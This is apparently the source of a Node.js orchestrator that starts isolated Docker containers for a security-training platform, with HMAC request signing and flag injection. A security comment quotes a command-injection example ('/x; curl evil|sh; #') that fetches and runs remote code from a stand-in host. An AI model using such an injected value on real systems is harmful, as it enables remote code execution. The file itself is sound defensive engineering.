/**
 * GuardianX Lab Orchestrator Service
 *
 * Manages Docker container lifecycle for interactive lab sessions.
 * Each lab session gets:
 *   - A dedicated target container (the vulnerable machine)
 *   - An optional attack container (Kali Linux with tools)
 *   - An isolated Docker network (no cross-tenant communication)
 *   - A dynamically generated, non-guessable flag injected into the target
 *   - A TTL (time-to-live) that auto-destroys idle instances
 *
 * SECURITY (hardened):
 *   - Every state-changing endpoint requires an HMAC-SHA256 request signature
 *     (X-Lab-Timestamp + X-Lab-Signature over `${ts}.${rawBody}`) using
 *     LAB_SHARED_SECRET. In DOCKER mode the secret is REQUIRED — without it
 *     the service refuses to act. In simulation mode (local dev) it is
 *     optional with a loud warning.
 *   - No CORS headers: this is a server-to-server service, never called by
 *     browsers.
 *   - Flag injection uses positional shell args (no string interpolation)
 *     so a hostile filePath/flag cannot achieve command injection.
 *   - /stop and /reset validate container/network ids against the in-memory
 *     session registry — arbitrary container ids are rejected, so a caller
 *     cannot destroy containers it doesn't own.
 *   - Per-session unique subnets (10.100.X.0/24, X tracked for collisions) —
 *     the previous fixed subnet made the 2nd concurrent session fail.
 *   - TTL reaper destroys expired sessions (containers + network) every 30s.
 *
 * Port: 3004
 * Docker Engine API: /var/run/docker.sock (Unix socket) or TCP
 */

import { createServer, IncomingMessage, ServerResponse } from "http"
import { createHmac, randomBytes, randomUUID, timingSafeEqual } from "crypto"

// Docker Engine API client — uses dockerode when available, simulation otherwise
let Docker: any = null
let dockerClient: any = null

const SIMULATION_MODE = !process.env.DOCKER_AVAILABLE

if (!SIMULATION_MODE) {
  try {
    // eslint-disable-next-line @typescript-eslint/no-require-imports
    Docker = require("dockerode")
    dockerClient = new Docker({ socketPath: process.env.DOCKER_HOST || "/var/run/docker.sock" })
    console.log("[docker] Connected to Docker Engine")
  } catch (e) {
    console.log("[docker] dockerode not available, falling back to simulation mode")
  }
}

const USE_DOCKER = !!dockerClient

const PORT = 3004
const DOCKER_SOCKET = process.env.DOCKER_HOST || "/var/run/docker.sock"

// === Shared secret ===
const LAB_SHARED_SECRET = process.env.LAB_SHARED_SECRET || ""
if (SIMULATION_MODE && !LAB_SHARED_SECRET) {
  console.warn(
    "[security] LAB_SHARED_SECRET not set — simulation mode accepts UNSIGNED requests (local dev only!).\n" +
    "[security] Set LAB_SHARED_SECRET to enable HMAC request verification."
  )
}
if (!SIMULATION_MODE && !LAB_SHARED_SECRET) {
  console.error(
    "[security] FATAL: DOCKER mode requires LAB_SHARED_SECRET. Refusing to accept any mutating requests.\n" +
    "[security] Generate one with: openssl rand -base64 32"
  )
}

// === Lab image definitions ===
const LAB_IMAGES: Record<string, { target: string; attack: string; targetPort: number }> = {
  // SQL Injection labs → share the SQLi target image
  "sqli-login-bypass":         { target: "guardianx/lab-sqli-target:latest",         attack: "guardianx/kali-attack:latest", targetPort: 80 },
  "sqli-auth-bypass-payloads": { target: "guardianx/lab-sqli-target:latest",         attack: "guardianx/kali-attack:latest", targetPort: 80 },
  // XSS labs → share the XSS target image
  "xss-cookie-steal":          { target: "guardianx/lab-xss-target:latest",          attack: "guardianx/kali-attack:latest", targetPort: 80 },
  "xss-stored-comment":        { target: "guardianx/lab-xss-target:latest",          attack: "guardianx/kali-attack:latest", targetPort: 80 },
  "xss-filter-bypass-waf":     { target: "guardianx/lab-xss-target:latest",          attack: "guardianx/kali-attack:latest", targetPort: 80 },
  // Command Injection
  "command-injection-bypass":  { target: "guardianx/lab-cmd-injection-target:latest", attack: "guardianx/kali-attack:latest", targetPort: 80 },
  // JWT labs → share the JWT target image
  "jwt-alg-none-bypass":       { target: "guardianx/lab-jwt-target:latest",           attack: "guardianx/kali-attack:latest", targetPort: 80 },
  "jwt-forgery-brute-force":   { target: "guardianx/lab-jwt-target:latest",           attack: "guardianx/kali-attack:latest", targetPort: 80 },
  // SSRF labs → share the SSRF target image
  "ssrf-cloud-metadata":       { target: "guardianx/lab-ssrf-target:latest",          attack: "guardianx/kali-attack:latest", targetPort: 80 },
  // Directory Traversal
  "directory-traversal-bypass":{ target: "guardianx/lab-traversal-target:latest",     attack: "guardianx/kali-attack:latest", targetPort: 80 },
  // Network / Recon
  "nmap-recon":                { target: "guardianx/lab-nmap-target:latest",          attack: "guardianx/kali-attack:latest", targetPort: 9999 },
  "wifi-wpa2-crack":           { target: "guardianx/lab-nmap-target:latest",          attack: "guardianx/kali-attack:latest", targetPort: 9999 },
  // Privilege Escalation
  "linux-privesc-suid":        { target: "guardianx/lab-privesc-target:latest",       attack: "guardianx/kali-attack:latest", targetPort: 22 },
  "windows-privesc-unquoted":  { target: "guardianx/lab-privesc-target:latest",       attack: "guardianx/kali-attack:latest", targetPort: 22 },
  // IDOR
  "idor-horizontal":           { target: "guardianx/lab-idor-target:latest",          attack: "guardianx/kali-attack:latest", targetPort: 80 },
  // Log4Shell
  "log4shell-cve-2021-44228":  { target: "guardianx/lab-log4shell-target:latest",     attack: "guardianx/kali-attack:latest", targetPort: 80 },
  // Reverse Engineering
  "re-crackme-binary":         { target: "guardianx/lab-re-crackme-target:latest",    attack: "guardianx/kali-attack:latest", targetPort: 22 },
  // Cryptography
  "hash-crack":                { target: "guardianx/lab-generic-target:latest",       attack: "guardianx/kali-attack:latest", targetPort: 80 },
  "steganography-hidden":      { target: "guardianx/lab-generic-target:latest",       attack: "guardianx/kali-attack:latest", targetPort: 80 },
  // Active Directory
  "ad-kerberoasting":          { target: "guardianx/lab-generic-target:latest",       attack: "guardianx/kali-attack:latest", targetPort: 88 },
  "powershell-lolbins":        { target: "guardianx/lab-generic-target:latest",       attack: "guardianx/kali-attack:latest", targetPort: 80 },
  // Forensics
  "pcap-analysis":             { target: "guardianx/lab-generic-target:latest",       attack: "guardianx/kali-attack:latest", targetPort: 80 },
  // Cloud Security
  "docker-container-escape":   { target: "guardianx/lab-generic-target:latest",       attack: "guardianx/kali-attack:latest", targetPort: 80 },
  "cloud-s3-enumeration":      { target: "guardianx/lab-generic-target:latest",       attack: "guardianx/kali-attack:latest", targetPort: 80 },
  "k8s-pod-escalation":        { target: "guardianx/lab-generic-target:latest",       attack: "guardianx/kali-attack:latest", targetPort: 80 },
  // OSINT
  "osint-target-profiling":    { target: "guardianx/lab-generic-target:latest",       attack: "guardianx/kali-attack:latest", targetPort: 80 },
  // Mobile / IoT
  "android-apk-reverse":       { target: "guardianx/lab-generic-target:latest",       attack: "guardianx/kali-attack:latest", targetPort: 80 },
  "iot-firmware-analysis":     { target: "guardianx/lab-generic-target:latest",       attack: "guardianx/kali-attack:latest", targetPort: 80 },
  // Advanced Web
  "race-condition-toctou":     { target: "guardianx/lab-generic-target:latest",       attack: "guardianx/kali-attack:latest", targetPort: 80 },
  "graphql-introspection":     { target: "guardianx/lab-generic-target:latest",       attack: "guardianx/kali-attack:latest", targetPort: 80 },
  // Buffer Overflow
  "buffer-overflow-eip":       { target: "guardianx/lab-generic-target:latest",       attack: "guardianx/kali-attack:latest", targetPort: 9999 },
  // Default fallback
  default:                     { target: "guardianx/lab-generic-target:latest",       attack: "guardianx/kali-attack:latest", targetPort: 80 },
}

// === Dynamic flag generation ===
function generateDynamicFlag(labSlug: string): string {
  const random = randomBytes(16).toString("hex")
  return `FLAG{${labSlug}_${random}}`
}

// === Session registry ===
// Source of truth for what THIS orchestrator owns. Any /stop or /reset for a
// session not in this registry is rejected — arbitrary container ids from
// request bodies are ignored.
interface ManagedSession {
  sessionId: string
  userId: string
  targetContainerId: string
  attackContainerId: string
  networkName: string
  subnet: string
  flagFilePath: string
  expiresAt: number
}
const managedSessions = new Map<string, ManagedSession>()

// === Subnet allocation ===
// Each session gets its own /24 inside 10.100.0.0/16 so concurrent sessions
// never collide (the previous fixed 10.100.0.0/24 broke session #2).
const usedSubnetOctets = new Set<number>()

function allocateSubnet(): string {
  for (let attempt = 0; attempt < 200; attempt++) {
    const octet = 1 + Math.floor(Math.random() * 254) // 10.100.[1-254].0/24
    if (!usedSubnetOctets.has(octet)) {
      usedSubnetOctets.add(octet)
      return `10.100.${octet}.0/24`
    }
  }
  throw new Error("No free subnets — too many concurrent lab sessions")
}

function releaseSubnet(subnet: string) {
  const m = subnet.match(/^10\.100\.(\d+)\./)
  if (m) usedSubnetOctets.delete(Number(m[1]))
}

// === Terminal WebSocket token ===
// Signed with LAB_SHARED_SECRET; verified by terminal-gateway.
function signTerminalToken(sessionId: string, userId: string, ttlMs: number): string {
  const payload = { sid: sessionId, uid: userId, exp: Date.now() + ttlMs }
  const payloadB64 = Buffer.from(JSON.stringify(payload), "utf8").toString("base64url")
  const sig = createHmac("sha256", LAB_SHARED_SECRET).update(payloadB64).digest("hex")
  return `${payloadB64}.${sig}`
}

// === Docker Engine API client ===
interface ContainerInfo {
  containerId: string
  ip: string
  networkName: string
}

async function dockerCreateNetwork(networkName: string, subnet: string): Promise<void> {
  if (SIMULATION_MODE) {
    console.log(`[sim] Created network: ${networkName} (subnet ${subnet})`)
    return
  }
  // Create isolated bridge network (Internal: true = no internet access)
  await dockerClient.createNetwork({
    Name: networkName,
    Driver: "bridge",
    Internal: true,
    IPAM: { Config: [{ Subnet: subnet }] },
  })
  console.log(`[docker] Created isolated network: ${networkName} (subnet ${subnet})`)
}

async function dockerCreateContainer(
  name: string,
  image: string,
  networkName: string,
  env: string[],
  capabilities: string[],
): Promise<ContainerInfo> {
  if (SIMULATION_MODE) {
    const fakeId = randomUUID().slice(0, 12)
    const fakeIp = `10.100.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`
    console.log(`[sim] Created container: ${name} (image: ${image}, ip: ${fakeIp})`)
    return { containerId: fakeId, ip: fakeIp, networkName }
  }

  // Pull image if not present
  try {
    await dockerClient.pull(image)
    await new Promise((r) => setTimeout(r, 1000)) // Wait for pull
  } catch (e) {
    // Image might already exist
  }

  const container = await dockerClient.createContainer({
    Image: image,
    name,
    Env: env,
    HostConfig: {
      NetworkMode: networkName,
      CapAdd: capabilities,
      Memory: 512 * 1024 * 1024, // 512MB
      NanoCpus: 1000000000, // 1 CPU
      SecurityOpt: ["no-new-privileges"],
    },
  })

  await container.start()

  const data = await container.inspect()
  const ip = data.NetworkSettings.Networks[networkName]?.IPAddress || "unknown"

  console.log(`[docker] Container started: ${name} (${container.id.slice(0, 12)}) IP: ${ip}`)
  return { containerId: container.id, ip, networkName }
}

async function dockerStopContainer(containerId: string): Promise<void> {
  if (SIMULATION_MODE) {
    console.log(`[sim] Stopped container: ${containerId}`)
    return
  }
  const container = dockerClient.getContainer(containerId)
  try { await container.stop({ t: 5 }) } catch {}
  try { await container.remove({ force: true, v: true }) } catch {}
  console.log(`[docker] Container destroyed: ${containerId}`)
}

async function dockerRemoveNetwork(networkName: string): Promise<void> {
  if (SIMULATION_MODE) {
    console.log(`[sim] Removed network: ${networkName}`)
    return
  }
  const network = dockerClient.getNetwork(networkName)
  try { await network.remove() } catch {}
  console.log(`[docker] Network removed: ${networkName}`)
}

async function dockerExec(containerId: string, cmd: string[]): Promise<void> {
  if (SIMULATION_MODE) {
    console.log(`[sim] Exec in ${containerId}: ${cmd.join(" ")}`)
    return
  }
  const container = dockerClient.getContainer(containerId)
  const exec = await container.exec({ Cmd: cmd, AttachStdout: true, AttachStderr: true })
  await exec.start({ Detach: false, Tty: false })
}

// === Flag injection ===
// SECURITY: NO string interpolation into a shell command. The flag and file
// path are passed as positional shell arguments ("$1", "$2") so a hostile
// value (e.g. "/x; curl evil|sh; #") cannot achieve command injection.
// Inputs are additionally format-validated below.
function safeFlagValue(flag: string): boolean {
  return /^FLAG\{[A-Za-z0-9_\-]+\}$/.test(flag)
}
function safeFlagPath(p: string): boolean {
  return /^\/root\/flag-[A-Za-z0-9\-]{1,64}\.txt$/.test(p)
}

async function injectFlag(containerId: string, flag: string, filePath: string): Promise<void> {
  if (!safeFlagValue(flag) || !safeFlagPath(filePath)) {
    throw new Error(`injectFlag: invalid flag or path format (refused)`)
  }
  // sh -c 'printf "%s" "$1" > "$2" && chmod 600 "$2"' sh <flag> <path>
  await dockerExec(containerId, [
    "sh", "-c",
    'printf "%s" "$1" > "$2" && chmod 600 "$2"',
    "sh", flag, filePath,
  ])
  console.log(`[orchestrator] Flag injected into ${containerId} at ${filePath}`)
}

// === Session lifecycle handlers ===

interface StartLabRequest {
  labSlug: string
  userId: string
  ttlMinutes?: number
}

interface StartLabResponse {
  sessionId: string
  status: string
  targetIp: string
  attackIp: string
  dynamicFlag: string
  expiresAt: string
  terminalToken: string
  networkName: string
}

async function handleStartLab(req: StartLabRequest): Promise<StartLabResponse> {
  const sessionId = randomUUID()
  const subnet = allocateSubnet()
  const networkName = `lab-net-${sessionId.slice(0, 8)}`
  const images = LAB_IMAGES[req.labSlug] || LAB_IMAGES.default
  const dynamicFlag = generateDynamicFlag(req.labSlug)
  const flagFilePath = `/root/flag-${sessionId.slice(0, 8)}.txt`
  const ttl = Math.min(Math.max(req.ttlMinutes || 60, 10), 180) // clamp 10..180 min
  const expiresAt = new Date(Date.now() + ttl * 60 * 1000)

  console.log(`\n[orchestrator] === STARTING LAB SESSION ===`)
  console.log(`[orchestrator] Session: ${sessionId}`)
  console.log(`[orchestrator] Lab: ${req.labSlug}`)
  console.log(`[orchestrator] User: ${req.userId}`)
  console.log(`[orchestrator] TTL: ${ttl} minutes (expires: ${expiresAt.toISOString()})`)
  console.log(`[orchestrator] Network: ${networkName} (subnet ${subnet}, internal-only)`)
  console.log(`[orchestrator] Flag file: ${flagFilePath}`)

  // Concurrency cap (resource exhaustion protection)
  const MAX_CONCURRENT = Number(process.env.LAB_MAX_CONCURRENT_SESSIONS || 25)
  if (managedSessions.size >= MAX_CONCURRENT) {
    releaseSubnet(subnet)
    throw new Error(`Concurrent session limit reached (${MAX_CONCURRENT})`)
  }

  // 1. Create isolated Docker network (internal: true = no internet)
  await dockerCreateNetwork(networkName, subnet)

  let session: ManagedSession
  try {
    // 2. Create and start the target container
    const targetEnv = [
      `FLAG=${dynamicFlag}`,
      `FLAG_FILE=${flagFilePath}`,
      `SESSION_ID=${sessionId}`,
    ]
    const target = await dockerCreateContainer(
      `lab-target-${sessionId.slice(0, 8)}`,
      images.target,
      networkName,
      targetEnv,
      [], // No extra capabilities for target
    )

    // 3. Inject the dynamic flag into the target filesystem
    await injectFlag(target.containerId, dynamicFlag, flagFilePath)

    // 4. Create and start the attack container (Kali Linux)
    const attackEnv = [
      `TARGET_IP=${target.ip}`,
      `SESSION_ID=${sessionId}`,
      `LAB_SLUG=${req.labSlug}`,
    ]
    const attack = await dockerCreateContainer(
      `lab-attack-${sessionId.slice(0, 8)}`,
      images.attack,
      networkName,
      attackEnv,
      ["NET_ADMIN", "SYS_PTRACE"], // Capabilities for pentesting tools
    )

    session = {
      sessionId,
      userId: req.userId,
      targetContainerId: target.containerId,
      attackContainerId: attack.containerId,
      networkName,
      subnet,
      flagFilePath,
      expiresAt: expiresAt.getTime(),
    }
    managedSessions.set(sessionId, session)

    // 5. Signed terminal WebSocket token (verified by terminal-gateway)
    const terminalToken = signTerminalToken(sessionId, req.userId, ttl * 60 * 1000 + 5 * 60 * 1000)

    console.log(`[orchestrator] Target container: ${target.containerId} (${target.ip})`)
    console.log(`[orchestrator] Attack container: ${attack.containerId} (${attack.ip})`)
    console.log(`[orchestrator] === LAB SESSION READY ===\n`)

    return {
      sessionId,
      status: "running",
      targetIp: target.ip,
      attackIp: attack.ip,
      dynamicFlag, // server-to-server only — the Next.js app stores it, never shows it
      expiresAt: expiresAt.toISOString(),
      terminalToken,
      networkName,
    }
  } catch (err) {
    // Rollback partial creation on failure
    releaseSubnet(subnet)
    try { await dockerRemoveNetwork(networkName) } catch {}
    throw err
  }
}

/** Destroy a managed session (used by /stop and the TTL reaper). */
async function destroySession(session: ManagedSession): Promise<void> {
  console.log(`[orchestrator] Destroying session ${session.sessionId}`)
  try { await dockerStopContainer(session.attackContainerId) } catch {}
  try { await dockerStopContainer(session.targetContainerId) } catch {}
  try { await dockerRemoveNetwork(session.networkName) } catch {}
  releaseSubnet(session.subnet)
  managedSessions.delete(session.sessionId)
}

async function handleStopLab(sessionId: string): Promise<void> {
  console.log(`[orchestrator] === STOPPING LAB SESSION: ${sessionId} ===`)
  const session = managedSessions.get(sessionId)
  if (!session) {
    throw new Error("Unknown session — not managed by this orchestrator")
  }
  await destroySession(session)
  console.log(`[orchestrator] Session ${sessionId} stopped and cleaned up.`)
}

async function handleExtendLab(sessionId: string, additionalMinutes: number): Promise<{ newExpiry: string }> {
  const session = managedSessions.get(sessionId)
  if (!session) throw new Error("Unknown session — not managed by this orchestrator")
  const extra = Math.min(Math.max(additionalMinutes || 30, 5), 120) // clamp 5..120 min
  session.expiresAt = Date.now() + extra * 60 * 1000
  const newExpiry = new Date(session.expiresAt)
  console.log(`[orchestrator] Extended session ${sessionId} by ${extra} minutes. New expiry: ${newExpiry.toISOString()}`)
  return { newExpiry: newExpiry.toISOString() }
}

async function handleResetLab(sessionId: string): Promise<{ newFlag: string }> {
  console.log(`[orchestrator] === RESETTING LAB SESSION: ${sessionId} ===`)
  const session = managedSessions.get(sessionId)
  if (!session) throw new Error("Unknown session — not managed by this orchestrator")

  // Regenerate the flag and re-inject
  const newFlag = generateDynamicFlag(session.sessionId)
  await injectFlag(session.targetContainerId, newFlag, session.flagFilePath)

  console.log(`[orchestrator] Session ${sessionId} reset. New flag generated.`)
  return { newFlag }
}

// === TTL enforcement ===
// Destroys expired sessions every 30 seconds (was an empty placeholder —
// abandoned lab containers used to accumulate forever).
setInterval(async () => {
  const now = Date.now()
  for (const session of Array.from(managedSessions.values())) {
    if (session.expiresAt < now) {
      try {
        await destroySession(session)
        console.log(`[reaper] Expired session ${session.sessionId} destroyed`)
      } catch (e: any) {
        console.error(`[reaper] Failed to destroy ${session.sessionId}:`, e?.message)
      }
    }
  }
}, 30 * 1000).unref?.()

// === HMAC request verification ===
function verifyRequestSignature(req: IncomingMessage, rawBody: string): boolean {
  if (!LAB_SHARED_SECRET) {
    // Simulation mode without a secret → allow (local dev), with warning
    if (SIMULATION_MODE) return true
    return false // Docker mode without secret → refuse everything
  }
  const ts = req.headers["x-lab-timestamp"] as string | undefined
  const sig = req.headers["x-lab-signature"] as string | undefined
  if (!ts || !sig) return false
  const tsNum = Number(ts)
  if (!Number.isFinite(tsNum) || Math.abs(Date.now() - tsNum) > 5 * 60 * 1000) return false
  const expected = createHmac("sha256", LAB_SHARED_SECRET).update(`${ts}.${rawBody}`).digest("hex")
  const a = Buffer.from(expected, "hex")
  const b = Buffer.from(sig, "hex")
  return a.length === b.length && timingSafeEqual(a, b)
}

// === HTTP Server ===
const server = createServer(async (req: IncomingMessage, res: ServerResponse) => {
  // NOTE: no CORS headers on purpose — browsers must never talk to this
  // service directly; it is server-to-server behind the Next.js app.

  if (req.method === "OPTIONS") { res.writeHead(204); res.end(); return }

  const url = new URL(req.url || "", `http://localhost:${PORT}`)
  const path = url.pathname
  const method = req.method || "GET"

  // Parse JSON body (with size cap)
  const parseBody = (): Promise<{ body: any; raw: string }> => new Promise((resolve, reject) => {
    let data = ""
    let size = 0
    req.on("data", (chunk) => {
      size += chunk.length
      if (size > 64 * 1024) { reject(new Error("Body too large")); req.destroy(); return }
      data += chunk
    })
    req.on("end", () => resolve({ body: data ? JSON.parse(data) : {}, raw: data }))
    req.on("error", reject)
  })

  const sendJSON = (code: number, data: any) => {
    res.writeHead(code, { "Content-Type": "application/json" })
    res.end(JSON.stringify(data))
  }

  try {
    // Health check — public, no signature
    if (path === "/health" && method === "GET") {
      sendJSON(200, {
        status: "ok",
        mode: SIMULATION_MODE ? "simulation" : "docker",
        port: PORT,
        activeSessions: managedSessions.size,
        authEnabled: !!LAB_SHARED_SECRET,
      })
      return
    }

    // Everything below requires a valid signature
    const { body, raw } = await parseBody()
    if (!verifyRequestSignature(req, raw)) {
      sendJSON(401, { error: "Invalid or missing request signature" })
      return
    }

    // Start a lab session
    // POST /start { labSlug, userId, ttlMinutes }
    if (path === "/start" && method === "POST") {
      if (!body.labSlug || !body.userId) {
        sendJSON(400, { error: "labSlug and userId required" })
        return
      }
      const result = await handleStartLab(body)
      sendJSON(200, result)
      return
    }

    // Stop a lab session — session id must be in the registry
    // POST /stop { sessionId }
    if (path === "/stop" && method === "POST") {
      if (!body.sessionId) {
        sendJSON(400, { error: "sessionId required" })
        return
      }
      await handleStopLab(body.sessionId)
      sendJSON(200, { ok: true, sessionId: body.sessionId, status: "stopped" })
      return
    }

    // Extend a lab session
    // POST /extend { sessionId, additionalMinutes }
    if (path === "/extend" && method === "POST") {
      if (!body.sessionId) {
        sendJSON(400, { error: "sessionId required" })
        return
      }
      const result = await handleExtendLab(body.sessionId, body.additionalMinutes || 30)
      sendJSON(200, { ok: true, ...result })
      return
    }

    // Reset a lab session (regenerate flag, reset target state)
    // POST /reset { sessionId }
    if (path === "/reset" && method === "POST") {
      if (!body.sessionId) {
        sendJSON(400, { error: "sessionId required" })
        return
      }
      const result = await handleResetLab(body.sessionId)
      sendJSON(200, { ok: true, ...result })
      return
    }

    // Get available lab images
    if (path === "/images" && method === "GET") {
      sendJSON(200, { images: Object.keys(LAB_IMAGES), simulation: SIMULATION_MODE })
      return
    }

    sendJSON(404, { error: "Not found" })
  } catch (err: any) {
    console.error("[orchestrator] Error:", err)
    sendJSON(500, { error: err?.message || "Internal error" })
  }
})

server.listen(PORT, process.env.LAB_BIND_HOST || "0.0.0.0", () => {
  console.log(`\n┌─────────────────────────────────────────────────┐`)
  console.log(`│  GuardianX Lab Orchestrator                     │`)
  console.log(`│  Port: ${PORT} (bound to 127.0.0.1)             │`)
  console.log(`│  Mode: ${SIMULATION_MODE ? "SIMULATION (no Docker)" : "DOCKER"}               │`)
  console.log(`│  Auth: ${LAB_SHARED_SECRET ? "HMAC (LAB_SHARED_SECRET)" : "UNSIGNED (dev only!)"}   │`)
  console.log(`└─────────────────────────────────────────────────┘`)
  console.log(`\nEndpoints (HMAC-signed except /health):`)
  console.log(`  POST /start   — Start a lab session (creates containers)`)
  console.log(`  POST /stop    — Stop a managed session (destroys containers)`)
  console.log(`  POST /extend  — Extend session TTL`)
  console.log(`  POST /reset   — Reset session (new flag, clean state)`)
  console.log(`  GET  /health  — Health check`)
  console.log(`  GET  /images  — Available lab images\n`)
})

process.on("SIGTERM", () => { server.close(() => process.exit(0)) })
process.on("SIGINT", () => { server.close(() => process.exit(0)) })
